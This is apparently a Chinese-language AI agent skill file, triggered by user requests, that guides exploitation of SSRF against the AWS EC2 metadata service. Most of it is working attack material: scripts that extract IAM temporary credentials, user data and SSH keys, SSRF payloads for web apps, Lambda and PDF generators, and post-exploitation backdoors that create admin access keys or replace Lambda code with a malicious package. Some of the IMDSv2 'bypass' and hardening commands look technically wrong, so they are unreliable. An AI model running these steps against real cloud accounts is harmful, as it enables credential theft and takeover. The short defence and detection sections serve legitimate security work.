---
name: aws-metadata-ssrf
description: AWS 元数据服务 SSRF 利用完整技术 - IMDSv1/v2 绕过方法
category: 云安全渗透测试
platform: AWS
technique_type: 元数据服务利用
triggers:
  - "AWS 元数据服务 SSRF"
  - "169.254.169.254"
  - "EC2 SSRF"
  - "IMDS 绕过"
---

# AWS 元数据服务 SSRF 利用

## 触发条件

当用户要求以下任务时激活此技能：

- "利用 SSRF 访问 AWS 元数据"
- "获取 EC2 实例凭证"
- "绕过 IMDSv2"
- "169.254.169.254 利用"
- "EC2 元数据服务渗透"

---

## 元数据服务端点

### IMDSv1 (已弃用)

```
http://169.254.169.254/latest/meta-data/
```

### IMDSv2 (当前版本)

```
http://169.254.169.254/latest/api/token
```

---

## IMDSv1 利用

### 基础信息枚举

```bash
# 获取 IAM 角色
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 输出示例:
# RoleName

# 获取临时凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName

# 响应示例:
{
  "Code" : "Success",
  "LastUpdated" : "2025-03-18T10:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "...",
  "Token" : "...",
  "Expiration" : "2025-03-18T16:00:00Z"
}

# 获取实例信息
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/meta-data/placement/region

# 获取用户数据
curl http://169.254.169.254/latest/user-data/

# 获取 SSH 密钥（如果暴露）
curl http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

### 完整枚举脚本

```bash
#!/bin/bash
# AWS 元数据服务枚举脚本

METADATA_URL="http://169.254.169.254/latest/meta-data"

echo "=== 实例信息 ==="
curl -s $METADATA_URL/instance-id
curl -s $METADATA_URL/local-ipv4
curl -s $METADATA_URL/public-ipv4
curl -s $METADATA_URL/placement/region
curl -s $METADATA_URL/placement/availability-zone

echo -e "\n=== IAM 角色 ==="
IAM_ROLE=$(curl -s $METADATA_URL/iam/security-credentials/)
echo "Role: $IAM_ROLE"

if [ ! -z "$IAM_ROLE" ]; then
    echo -e "\n=== 临时凭证 ==="
    curl -s $METADATA_URL/iam/security-credentials/$IAM_ROLE
fi

echo -e "\n=== 用户数据 ==="
curl -s http://169.254.169.254/latest/user-data/

echo -e "\n=== SSH 密钥 ==="
curl -s $METADATA_URL/public-keys/0/openssh-key

echo -e "\n=== 网络配置 ==="
curl -s $METADATA_URL/network/interfaces/macs/
```

---

## IMDSv2 利用

### IMDSv2 工作原理

IMDSv2 使用会话令牌机制：
1. 客户端先请求 TTL 令牌（PUT 请求）
2. 使用令牌获取元数据（GET 请求）

### 基础利用

```bash
# 步骤 1: 获取令牌
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

echo "Token: $TOKEN"

# 步骤 2: 使用令牌获取 IAM 角色
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 步骤 3: 获取临时凭证
ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```

### IMDSv2 绕过方法

#### 方法 1: SSRF 重绕

```bash
# 某些应用可能允许构造 PUT 请求
# 例如：
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  --proxy http://target.com/
```

#### 方法 2: HTTP 头部注入

```bash
# 如果 SSRF 漏洞允许自定义头部
# 构造特殊请求绕过 IMDSv2
curl -H "X-aws-ec2-metadata-token: ttl-seconds:21600" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### 方法 3: Web 代理绕过

某些 Web 代理可能允许访问 IMDSv1，即使实例强制使用 IMDSv2。

#### 方法 4: IPv6 绕过

```bash
# 尝试通过 IPv6 访问
curl -g -6 "http://[fe80::1%eth0]/latest/meta-data/"
```

---

## SSRF 利用场景

### 场景 1: SSRF in Web Applications

```python
# 恶意 URL
url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 如果应用存在 SSRF
import requests
response = requests.get(url)
print(response.text)

# 返回:
# RoleName

# 获取凭证
url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{response.text}"
credentials = requests.get(url)
print(credentials.json())

# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }
```

### 场景 2: SSRF in Microservices

```bash
# 微服务之间的通信可能被利用
# 例如：服务 A 可以请求内部地址
curl -X POST http://service-a.internal/api/forward \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

### 场景 3: SSRF in Serverless Functions

```javascript
// Lambda 函数中的 SSRF
const https = require('https');

exports.handler = async (event) => {
    const url = event.url; // 用户控制的 URL

    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => { resolve(data); });
        });
    });
};

// 利用：
// {
//   "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
// }
```

### 场景 4: SSRF in Document Generation

```bash
# 某些文档生成服务可能支持加载外部资源
# 例如：生成 PDF 时加载图片
POST /api/generate-pdf
{
    "content": "<img src='http://169.254.169.254/latest/meta-data/iam/security-credentials/'>"
}
```

---

## 元数据服务高级利用

### 1. 动态端口扫描

```bash
# 通过元数据服务发现内部服务
for port in 80 443 8080 3000 8000 9000; do
  timeout 1 bash -c "echo >/dev/tcp/169.254.169.254/$port" && echo "Port $port is open"
done
```

### 2. 用户数据注入

```bash
# 检查用户数据中的敏感信息
curl http://169.254.169.254/latest/user-data/

# 可能包含：
# - 启动脚本
# - 密钥和密码
# - 内部服务地址
# - 配置信息
```

### 3. SSH 密钥提取

```bash
# 获取实例的 SSH 公钥
curl http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key

# 暴力破解所有可能的密钥索引
for i in {0..10}; do
  echo "Key $i:"
  curl -s http://169.254.169.254/latest/meta-data/public-keys/$i/openssh-key
done
```

### 4. 网络配置枚举

```bash
# 获取网络接口信息
MACS=$(curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/)

for mac in $MACS; do
    echo "Interface: $mac"

    # 获取子网信息
    curl -s "http://169.254.169.254/latest/meta-data/network/interfaces/macs/$mac/subnet-ipv4/"

    # 获取安全组
    curl -s "http://169.254.169.254/latest/meta-data/network/interfaces/macs/$mac/security-groups/"

    # 获取公网 IP
    curl -s "http://169.254.169.254/latest/meta-data/network/interfaces/macs/$mac/public-ipv4s/"
done
```

---

## 跨账户攻击

### 步骤 1: 获取凭证

```bash
# 从元数据服务获取临时凭证
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Token')
```

### 步骤 2: 枚举权限

```bash
# 使用获取的凭证枚举权限
aws sts get-caller-identity

# 检查角色权限
aws iam list-attached-role-policies --role-name $ROLE_NAME

# 枚举可访问资源
aws ec2 describe-instances
aws s3 ls
```

### 步骤 3: 横向移动

```bash
# 如果有权限，创建持久化后门
aws iam create-access-key --user-name admin

# 或创建新的 Lambda 后门
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://malicious.zip
```

---

## 防御措施

### 1. 强制使用 IMDSv2

```bash
# 在 EC2 实例上强制使用 IMDSv2
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxx \
  --http-endpoint enabled \
  --http-token-required \
  --http-put-response-hop-limit 1

# 对整个账户强制 IMDSv2
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxx \
  --http-put-response-hop-limit 1
```

### 2. 限制跳数限制

```bash
# 设置 Hop Limit 为 1，防止容器访问元数据服务
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxx \
  --http-put-response-hop-limit 1
```

### 3. 禁用元数据服务

```bash
# 如果不需要，完全禁用
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxx \
  --http-endpoint disabled
```

### 4. 网络隔离

```bash
# 使用安全组和 NACL 限制对元数据服务的访问
# 仅允许特定流量
```

---

## 检测方法

### CloudTrail 监控

```bash
# 监控来自元数据服务的异常请求
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceType,AttributeValue=AWS::EC2::Instance \
  --start-time 2025-03-01T00:00:00Z

# 查找 IAM 角色使用异常
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetCallerIdentity
```

### GuardDuty 规则

- IAM role/credential anomaly
- UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration
- Backdoor:EC2/C&CActivityInVPC

---

## 实战案例

### 案例 1: Web 应用 SSRF

```
目标：有一个 SSRF 漏洞的 Web 应用
步骤：
1. 发现 SSRF 点：/api/fetch?url=http://...
2. 测试内网地址：url=http://169.254.169.254/latest/meta-data/
3. 获取 IAM 角色：url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
4. 获取临时凭证：url=http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName
5. 使用凭证进行横向移动
```

### 案例 2: 容器逃逸

```
目标：EC2 实例上运行的 Docker 容器
步骤：
1. 获取容器访问宿主机元数据服务的能力
2. 检查 Hop Limit 设置
3. 如果 Hop Limit > 1，容器可以访问元数据服务
4. 利用容器内的 SSRF 漏洞获取凭证
5. 使用凭证逃逸容器
```

---

## 参考资源

- HackTricks AWS Metadata: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-pentesting/aws-iam-privesc
- AWS IMDSv2 文档: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- SSRF 攻击指南: https://portswigger.net/web-security/ssrf
